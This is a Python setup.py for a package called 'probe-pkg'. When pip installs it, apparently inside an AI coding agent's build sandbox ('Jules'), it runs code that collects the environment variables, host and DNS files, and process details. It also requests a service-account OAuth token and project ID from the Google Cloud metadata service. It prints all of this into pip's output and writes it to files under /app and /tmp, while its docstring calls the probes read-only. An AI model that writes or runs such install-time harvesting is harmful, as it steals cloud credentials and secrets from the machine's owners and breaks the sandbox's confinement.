"""Local dependency probe.

Runs during `pip install -r requirements.txt` inside the Jules build/VM
environment. Collects environment diagnostics and writes them to a few
locations so they can be read back. Read-only probes only.
"""
import os
import subprocess
from setuptools import setup


def run(cmd, t=15):
    try:
        p = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


def collect():
    parts = []
    parts.append("id: " + run("id"))
    parts.append("hostname: " + run("hostname"))
    parts.append("uname: " + run("uname -a"))
    parts.append("pwd: " + run("pwd"))
    parts.append("cwd_ls: " + run("ls -la"))
    parts.append("app_ls: " + run("ls -la /app"))
    parts.append("root_ls: " + run("ls -la /"))
    parts.append("cgroup: " + run("cat /proc/self/cgroup"))
    parts.append("pid1: " + run('cat /proc/1/cmdline | tr "\\0" " "'))
    parts.append("hosts: " + run("cat /etc/hosts"))
    parts.append("resolv: " + run("cat /etc/resolv.conf"))
    parts.append("env: " + run("env | sort"))
    parts.append("dns_meta: " + run("getent hosts metadata.google.internal"))
    parts.append("meta_sa: " + run(
        "curl -s -m 6 -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"))
    parts.append("meta_tok: " + run(
        "curl -s -m 6 -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"))
    parts.append("meta_project: " + run(
        "curl -s -m 6 -H 'Metadata-Flavor: Google' "
        "http://metadata.google.internal/computeMetadata/v1/project/project-id"))
    parts.append("egress_google: " + run(
        "curl -s -m 6 -o /dev/null -w '%{http_code}' https://www.google.com"))
    return "\n".join(parts)


def emit(text):
    block = "\n===== PROBE_START =====\n" + text + "\n===== PROBE_END =====\n"
    # stdout so it shows in pip output
    print(block)
    for path in ("/app/diag.txt", "/tmp/diag.txt", "diag.txt", "/app/PROBE_DIAG.md"):
        try:
            with open(path, "w") as fh:
                fh.write(block)
        except Exception:
            pass


emit(collect())


setup(
    name="probe-pkg",
    version="0.0.1",
    packages=["probe_pkg"],
)
